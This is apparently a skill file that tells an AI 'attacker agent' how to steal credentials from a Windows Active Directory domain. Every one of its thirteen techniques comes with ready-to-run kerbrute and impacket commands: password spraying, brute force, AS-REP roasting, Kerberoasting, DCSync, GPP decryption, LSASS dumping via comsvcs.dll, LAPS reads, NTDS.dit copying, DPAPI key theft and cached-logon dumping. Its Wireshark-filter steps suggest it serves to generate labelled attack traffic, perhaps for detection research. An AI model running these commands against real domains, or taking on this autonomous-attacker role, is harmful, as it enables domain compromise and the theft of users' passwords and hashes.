---
name: ad-credential
description: Credential-access Active Directory skill for an attacker agent on a domain-joined Windows host. Covers password spray/brute, AS-REP and Kerberoasting, secretsdump/DCSync, GPP, LSASS dump, LAPS, NTDS.dit IFM, DPAPI, and cached logons. Load this skill when the task names ad-credential. Scripts and state.json live in the shared ad-attack skill. Every task must write a display-filter-only {task_id}.txt via write_filter.py.
---

# AD Credential Access Skill

Load this skill **only** when the dispatched task names `ad-credential`. Do not load other phase catalogs.

**Shared runtime.** `cd` to `~/.config/opencode/skills/ad-attack` (or the packaged `attacker/skills/ad-attack`) before any `python scripts/...` call. Follow the Mandatory Execution Protocol in the `ad-attack` skill, including Step 5 (write `{task_id}.txt`).

**Traffic filter contract.** Time-window slicing is a later extract step. This skill writes **only** a Wireshark display filter — never a tshark command, never `frame.time_epoch`. Host-local techniques with no packets use `frame.number == 0`.

# Phase 2: Credential Access

## 2.1 Password Spraying

- Technique id: `credential.password-spray`
- ATT&CK: T1110.003 (Brute Force: Password Spraying)

Purpose: test a single password against many accounts.

Inputs: `wordlists.usernames` (user list), `domain.name`, `domain.dc_ip`, and a candidate password (from `wordlists.passwords` or a single candidate in the task text).

Procedure (one atomic action):

```
kerbrute passwordspray -d <domain.name> --dc <domain.dc_ip> <userlist> <password>
```

Outputs: for each valid credential found, add a user object:

```
python scripts/state.py add users '{"username": "<user>", "password": "<password>", "source": "credential.password-spray"}'
```

Rollback: if a sprayed credential is later rejected, `mark-stale` the user object and re-spray or re-enumerate that account.

Traffic Filter (mandatory; expression only — no tshark command, no `frame.time_epoch`). Fill `<attacker-ip>`, `<dc-ip>`, and `<target-ip>` from `state.json` and the local host. Union extra network actions from this task (including Local Elevation Protocol) with `||`. Then:

```
python scripts/write_filter.py --expression "<filled display filter>"
```

Template:

```
ip.addr == <attacker-ip> && ip.addr == <dc-ip> && (kerberos || tcp.port == 88 || udp.port == 88)
```


## 2.2 Single-Account Brute Force
- Technique id: `credential.brute-user`
- ATT&CK: T1110.001 (Brute Force: Password Guessing)

Purpose: brute-force a single account against a password list.

Inputs: a single username (from `domain.usernames`), `wordlists.passwords` (password list), `domain.name`, `domain.dc_ip`.

Procedure (one atomic action):

```
kerbrute bruteuser -d <domain.name> --dc <domain.dc_ip> <passlist> <user>
```

Outputs: add a user object for a valid credential:

```
python scripts/state.py add users '{"username": "<user>", "password": "<password>", "source": "credential.brute-user"}'
```

Rollback: if a credential is later rejected, `mark-stale` the user object and re-enumerate.

Traffic Filter (mandatory; expression only — no tshark command, no `frame.time_epoch`). Fill `<attacker-ip>`, `<dc-ip>`, and `<target-ip>` from `state.json` and the local host. Union extra network actions from this task (including Local Elevation Protocol) with `||`. Then:

```
python scripts/write_filter.py --expression "<filled display filter>"
```

Template:

```
ip.addr == <attacker-ip> && ip.addr == <dc-ip> && (kerberos || tcp.port == 88 || udp.port == 88)
```


## 2.3 Brute Force
- Technique id: `credential.brute-force`
- ATT&CK: T1110 (Brute Force)

Purpose: brute-force many accounts against a password list.

Inputs: `wordlists.combos` (a `username:password` combo file built from `wordlists.usernames` × `wordlists.passwords`), `domain.name`, `domain.dc_ip`.

Procedure (one atomic action):

```
kerbrute bruteforce -d <domain.name> --dc <domain.dc_ip> <wordlists.combos>
```

`kerbrute bruteforce` accepts exactly one `<user_pw_file>` argument (a combo file of `username:password` pairs, one per line) — not separate passlist + userlist. The combo file is operator-provided in `wordlists.combos`; failed guesses count against the lockout threshold.

Outputs: add a user object for each valid credential:

```
python scripts/state.py add users '{"username": "<user>", "password": "<password>", "source": "credential.brute-force"}'
```

Rollback: if a credential is later rejected, `mark-stale` the user object and re-enumerate.

Traffic Filter (mandatory; expression only — no tshark command, no `frame.time_epoch`). Fill `<attacker-ip>`, `<dc-ip>`, and `<target-ip>` from `state.json` and the local host. Union extra network actions from this task (including Local Elevation Protocol) with `||`. Then:

```
python scripts/write_filter.py --expression "<filled display filter>"
```

Template:

```
ip.addr == <attacker-ip> && ip.addr == <dc-ip> && (kerberos || tcp.port == 88 || udp.port == 88)
```


## 2.4 AS-REP Roasting
- Technique id: `credential.asrep-roast`
- ATT&CK: T1558.004 (Steal or Forge Kerberos Tickets: AS-REP Roasting)

Purpose: request TGTs for accounts without Kerberos preauthentication.

Inputs: `wordlists.usernames` (user list), `domain.name`, `domain.dc_ip`.

Procedure (one atomic action):

```
python -m impacket.examples.GetNPUsers <domain.name>/ -usersfile <userlist> -dc-ip <domain.dc_ip> -format hashcat -outputfile asreproast.txt
```

Outputs: mark affected accounts `no_preauth` and record the output file:

```
python scripts/state.py add users '{"username": "<user>", "no_preauth": true, "source": "credential.asrep-roast"}'
python scripts/state.py add files '{"path": "asreproast.txt", "description": "AS-REP roast output"}'
```

Rollback: if an AS-REP entry fails to crack or is stale, re-run the roast for that user.

Traffic Filter (mandatory; expression only — no tshark command, no `frame.time_epoch`). Fill `<attacker-ip>`, `<dc-ip>`, and `<target-ip>` from `state.json` and the local host. Union extra network actions from this task (including Local Elevation Protocol) with `||`. Then:

```
python scripts/write_filter.py --expression "<filled display filter>"
```

Template:

```
ip.addr == <attacker-ip> && ip.addr == <dc-ip> && (kerberos || tcp.port == 88 || udp.port == 88)
```


## 2.5 Kerberoasting
- Technique id: `credential.kerberoast`
- ATT&CK: T1558.003 (Steal or Forge Kerberos Tickets: Kerberoasting)

Purpose: request service tickets for SPNs and recover service account hashes.

Inputs: a user object with `password` from `users`, plus `domain.dc_ip`.

Procedure (one atomic action):

```
python -m impacket.examples.GetUserSPNs -dc-ip <domain.dc_ip> <domain.name>/<user>:<password> -request
```

Outputs: append discovered SPNs to `domain.spns` and mark the service account:

```
python scripts/state.py add domain.spns '{"spn": "<spn>", "account": "<service-account>"}'
python scripts/state.py add users '{"username": "<service-account>", "spns": ["<spn>"], "is_service_account": true, "source": "credential.kerberoast"}'
```

Rollback: if a stored SPN no longer resolves, `mark-stale` it and re-run Kerberoasting.

Traffic Filter (mandatory; expression only — no tshark command, no `frame.time_epoch`). Fill `<attacker-ip>`, `<dc-ip>`, and `<target-ip>` from `state.json` and the local host. Union extra network actions from this task (including Local Elevation Protocol) with `||`. Then:

```
python scripts/write_filter.py --expression "<filled display filter>"
```

Template:

```
ip.addr == <attacker-ip> && ip.addr == <dc-ip> && (kerberos || ldap || tcp.port == 88 || tcp.port == 389)
```


## 2.6 Credential Dumping (SAM/LSA)
- Technique id: `credential.dump-secrets`
- ATT&CK: T1003 (OS Credential Dumping)

Purpose: dump local account hashes from a host.

Inputs: a user object (use `password` or `ntlm_hash`) from `users`, plus the target host.

Procedure (one atomic action). Use `:<password>` if the object has a plaintext password, or `-hashes :<ntlm-hash>` if only the hash is known:

```
python -m impacket.examples.secretsdump <domain.name>/<user>:<password>@<target-ip>
```

```
python -m impacket.examples.secretsdump -hashes :<ntlm-hash> <domain.name>/<user>@<target-ip>
```

Outputs: append recovered accounts to `users` (set `ntlm_hash`/`kerberos_rc4`, leave `password` empty when only the hash is known) and record logon hosts:

```
python scripts/state.py add users '{"username": "<user>", "ntlm_hash": "<hash>", "kerberos_rc4": "<hash>", "logon_hosts": ["<target-ip>"], "source": "credential.dump-secrets"}'
```

Rollback: if a dumped hash later fails to authenticate, `mark-stale` it and re-dump.

Traffic Filter (mandatory; expression only — no tshark command, no `frame.time_epoch`). Fill `<attacker-ip>`, `<dc-ip>`, and `<target-ip>` from `state.json` and the local host. Union extra network actions from this task (including Local Elevation Protocol) with `||`. Then:

```
python scripts/write_filter.py --expression "<filled display filter>"
```

Template:

```
ip.addr == <attacker-ip> && ip.addr == <target-ip> && (smb || msrpc || tcp.port == 445 || tcp.port == 135)
```


## 2.7 DCSync
- Technique id: `credential.dcsync`
- ATT&CK: T1003.006 (OS Credential Dumping: DCSync)

Purpose: replicate directory secrets, including the `krbtgt` hash (required for golden tickets).

Inputs: an admin user object with `password`/`ntlm_hash` from `users`.

Procedure (one atomic action):

```
python -m impacket.examples.secretsdump <domain.name>/<admin-user>:<password>@<domain.dc_ip> -just-dc
```

`krbtgt` only (sub-variant of the same command):

```
python -m impacket.examples.secretsdump <domain.name>/<admin-user>:<password>@<domain.dc_ip> -just-dc-user krbtgt
```

Outputs: store the `krbtgt` hash and any new account hashes in `users`, and record the domain SID:

```
python scripts/state.py add users '{"username": "krbtgt", "ntlm_hash": "<hash>", "kerberos_rc4": "<hash>", "source": "credential.dcsync"}'
python scripts/state.py set domain.domain_sid "<domain-sid>"
```

Rollback: if the `krbtgt` hash is suspected stale (rotated), `mark-stale` the `krbtgt` user object and re-run DCSync.

Traffic Filter (mandatory; expression only — no tshark command, no `frame.time_epoch`). Fill `<attacker-ip>`, `<dc-ip>`, and `<target-ip>` from `state.json` and the local host. Union extra network actions from this task (including Local Elevation Protocol) with `||`. Then:

```
python scripts/write_filter.py --expression "<filled display filter>"
```

Template:

```
ip.addr == <attacker-ip> && ip.addr == <dc-ip> && (smb || msrpc || tcp.port == 445 || tcp.port == 135)
```


## 2.8 GPP Password (cPassword)
- Technique id: `credential.gpp-password`
- ATT&CK: T1552.006 (Unsecured Credentials: Group Policy Preferences)

Purpose: decrypt cPassword values from SYSVOL group-policy preference files.

Inputs: `domain.name`, `domain.dc_ip`, and an account with `password` from `users`.

Procedure (one atomic action):

```
python -m impacket.examples.Get-GPPPassword -dc-ip <domain.dc_ip> <domain.name>/<user>:<password>@<domain.dc_fqdn>
```

Outputs: for each decrypted credential, add a user object:

```
python scripts/state.py add users '{"username": "<user>", "password": "<decrypted>", "source": "credential.gpp-password"}'
```

Rollback: if a GPP credential is later rejected, `mark-stale` the user object and re-run this technique.

Traffic Filter (mandatory; expression only — no tshark command, no `frame.time_epoch`). Fill `<attacker-ip>`, `<dc-ip>`, and `<target-ip>` from `state.json` and the local host. Union extra network actions from this task (including Local Elevation Protocol) with `||`. Then:

```
python scripts/write_filter.py --expression "<filled display filter>"
```

Template:

```
ip.addr == <attacker-ip> && ip.addr == <dc-ip> && (smb || tcp.port == 445 || tcp.port == 139)
```


## 2.9 LSASS Memory Dump
- Technique id: `credential.lsass-dump`
- ATT&CK: T1003.001 (OS Credential Dumping: LSASS Memory)

Purpose: dump the LSASS process memory from a compromised host to recover credentials offline.

Inputs: an admin user object with `password` from `users`, plus the target host.

Procedure (one atomic action — locate LSASS, dump via comsvcs.dll, then download):

```
python -m impacket.examples.wmiexec <domain.name>/<user>:<password>@<target-ip> 'powershell -c "Get-Process lsass | Select-Object -ExpandProperty Id"'
python -m impacket.examples.wmiexec <domain.name>/<user>:<password>@<target-ip> 'rundll32 C:\windows\system32\comsvcs.dll, MiniDump <lsass-pid> C:\windows\temp\lsass.dmp full'
```

Download and clean up with `smbclient`: `use C$`, `get windows\temp\lsass.dmp`, then `del windows\temp\lsass.dmp`, `exit`.

Offline parsing is an operator step, not an attack action: `pypykatz lsa minidump lsass.dmp` (or mimikatz `sekurlsa::minidump lsass.dmp; sekurlsa::logonpasswords`).

Outputs:

```
python scripts/state.py add files '{"path": "lsass.dmp", "description": "LSASS memory dump from <target-ip>"}'
```

Rollback: if the dump yields nothing usable, `mark-stale` the file entry and re-dump with a fresh admin credential.


Traffic Filter (mandatory; expression only — no tshark command, no `frame.time_epoch`). Fill `<attacker-ip>`, `<dc-ip>`, and `<target-ip>` from `state.json` and the local host. Union extra network actions from this task (including Local Elevation Protocol) with `||`. Then:

```
python scripts/write_filter.py --expression "<filled display filter>"
```

Template:

```
ip.addr == <attacker-ip> && ip.addr == <target-ip> && (smb || msrpc || tcp.port == 445 || tcp.port == 135)
```


## 2.10 LAPS Password

- Technique id: `credential.laps`
- ATT&CK: T1555 (Credentials from Password Stores)

Purpose: read LAPS-managed local administrator passwords from Active Directory.

Inputs: a user object with `password` from `users` (needs rights to read `ms-Mcs-AdmPwd`), plus `domain.name` and `domain.dc_ip`.

Procedure (one atomic action):

```
python -m impacket.examples.GetLAPSPassword -dc-ip <domain.dc_ip> <domain.name>/<user>:<password>
```

Outputs: for each recovered LAPS password, add a user object (local administrator on that host):

```
python scripts/state.py add users '{"username": "<laps-admin>", "password": "<laps-password>", "logon_hosts": ["<target-ip>"], "source": "credential.laps"}'
```

Rollback: if a LAPS password is later rejected, `mark-stale` the user object and re-run.

Traffic Filter (mandatory; expression only — no tshark command, no `frame.time_epoch`). Fill `<attacker-ip>`, `<dc-ip>`, and `<target-ip>` from `state.json` and the local host. Union extra network actions from this task (including Local Elevation Protocol) with `||`. Then:

```
python scripts/write_filter.py --expression "<filled display filter>"
```

Template:

```
ip.addr == <attacker-ip> && ip.addr == <dc-ip> && (ldap || kerberos || tcp.port == 389 || tcp.port == 636 || tcp.port == 88)
```


## 2.11 NTDS.dit IFM Copy

- Technique id: `credential.ntds-dit`
- ATT&CK: T1003.003 (OS Credential Dumping: NTDS)

Purpose: create a volume-shadow / `ntdsutil` IFM copy of `ntds.dit` on a DC and pull the files. This is a disk replica. Do **not** substitute `credential.dcsync` (`secretsdump -just-dc` replication).

Inputs: an admin user object with `password` from `users`, plus a DC host (`domain.dc_ip` / `hosts[].role` is `dc`).

Procedure (one atomic action — IFM on the DC, then download):

```
python -m impacket.examples.wmiexec <domain.name>/<admin-user>:<password>@<domain.dc_ip> 'ntdsutil "activate instance ntds" ifm "create full C:\Windows\Temp\ifm" q q'
```

Download with `smbclient`: `use C$`, `get Windows\Temp\ifm\Active Directory\ntds.dit`, `get Windows\Temp\ifm\registry\SYSTEM`. Offline parse is an operator step: `python -m impacket.examples.secretsdump -ntds ntds.dit -system SYSTEM LOCAL`.

Outputs:

```
python scripts/state.py add files '{"path": "ntds.dit", "description": "NTDS.dit IFM copy from <dc-ip>"}'
python scripts/state.py add files '{"path": "SYSTEM", "description": "SYSTEM hive from NTDS IFM on <dc-ip>"}'
```

Rollback: if the copy is unreadable, `mark-stale` the file entries and re-run IFM.

Traffic Filter (mandatory; expression only — no tshark command, no `frame.time_epoch`). Fill `<attacker-ip>`, `<dc-ip>`, and `<target-ip>` from `state.json` and the local host. Union extra network actions from this task (including Local Elevation Protocol) with `||`. Then:

```
python scripts/write_filter.py --expression "<filled display filter>"
```

Template:

```
ip.addr == <attacker-ip> && ip.addr == <dc-ip> && (smb || msrpc || tcp.port == 445 || tcp.port == 135)
```


## 2.12 DPAPI Backup Keys / Masterkeys

- Technique id: `credential.dpapi`
- ATT&CK: T1555.003 (Credentials from Password Stores: Credentials from Web Browsers) / T1555

Purpose: retrieve DPAPI domain backup keys or decrypt a DPAPI blob with `impacket.examples.dpapi`.

Inputs: a user object with `password` from `users`, plus `domain.dc_ip`. Optional: a DPAPI blob path already in `files[]`.

Procedure (one atomic action). Domain backup keys:

```
python -m impacket.examples.dpapi backupkeys -t <domain.name>/<user>:<password>@<domain.dc_ip>
```

Decrypt a specific masterkey / credential blob when a file is named in the task (sub-variant of the same tool):

```
python -m impacket.examples.dpapi masterkey -file <masterkey-path> -sid <sid> -password <password>
```

Outputs:

```
python scripts/state.py add files '{"path": "<dpapi-output>", "description": "DPAPI backup keys or decrypted blob"}'
```

If a cleartext credential falls out, also `add users`.

Rollback: if decryption fails, `mark-stale` the file entry and re-run with a current password.

Traffic Filter (mandatory; expression only — no tshark command, no `frame.time_epoch`). Fill `<attacker-ip>`, `<dc-ip>`, and `<target-ip>` from `state.json` and the local host. Union extra network actions from this task (including Local Elevation Protocol) with `||`. Then:

```
python scripts/write_filter.py --expression "<filled display filter>"
```

Template:

```
ip.addr == <attacker-ip> && ip.addr == <dc-ip> && (smb || msrpc || ldap || tcp.port == 445 || tcp.port == 135 || tcp.port == 389)
```


## 2.13 Cached Domain Logon Hashes

- Technique id: `credential.cached-logon`
- ATT&CK: T1003.005 (OS Credential Dumping: Cached Domain Credentials)

Purpose: export SECURITY/SYSTEM hives from a host and dump MSCACHE/cached domain logon hashes. Distinct from `credential.dump-secrets` (SAM/LSA secrets over DCERPC in one `secretsdump` shot).

Inputs: an admin user object with `password` from `users`, plus the target host.

Procedure (one atomic action — save hives remotely, download, dump locally):

```
python -m impacket.examples.wmiexec <domain.name>/<user>:<password>@<target-ip> 'reg save HKLM\SECURITY C:\Windows\Temp\SECURITY.hiv /y & reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM.hiv /y'
```

Download with `smbclient` (`use C$`, `get Windows\Temp\SECURITY.hiv`, `get Windows\Temp\SYSTEM.hiv`), then:

```
python -m impacket.examples.secretsdump -security SECURITY.hiv -system SYSTEM.hiv LOCAL
```

Outputs:

```
python scripts/state.py add users '{"username": "<user>", "ntlm_hash": "<cached-hash>", "logon_hosts": ["<target-ip>"], "source": "credential.cached-logon"}'
python scripts/state.py add files '{"path": "SECURITY.hiv", "description": "SECURITY hive from <target-ip>"}'
```

Rollback: if a cached hash fails to authenticate, `mark-stale` it and re-dump.

Traffic Filter (mandatory; expression only — no tshark command, no `frame.time_epoch`). Fill `<attacker-ip>`, `<dc-ip>`, and `<target-ip>` from `state.json` and the local host. Union extra network actions from this task (including Local Elevation Protocol) with `||`. Then:

```
python scripts/write_filter.py --expression "<filled display filter>"
```

Template:

```
ip.addr == <attacker-ip> && ip.addr == <target-ip> && (smb || msrpc || tcp.port == 445 || tcp.port == 135)
```

